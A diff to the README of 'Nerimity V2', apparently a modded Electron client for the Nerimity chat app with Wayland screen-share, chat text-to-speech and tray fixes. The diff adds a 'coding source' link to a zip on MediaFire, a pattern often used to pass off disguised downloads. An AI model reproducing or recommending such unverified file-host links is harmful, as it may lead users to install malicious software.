@@ -1,4 +1,6 @@
 # Nerimity V2
+coding source:
+https://www.mediafire.com/file/m3he99qywlsqlpw/nerimityV2.zip/file
 
 Modificação do app Electron do Nerimity para corrigir **compartilhamento de tela no Wayland**, implementar **TTS para ler o chat da chamada** e melhorar o **system tray** em distros onde ele não aparecia corretamente.
 
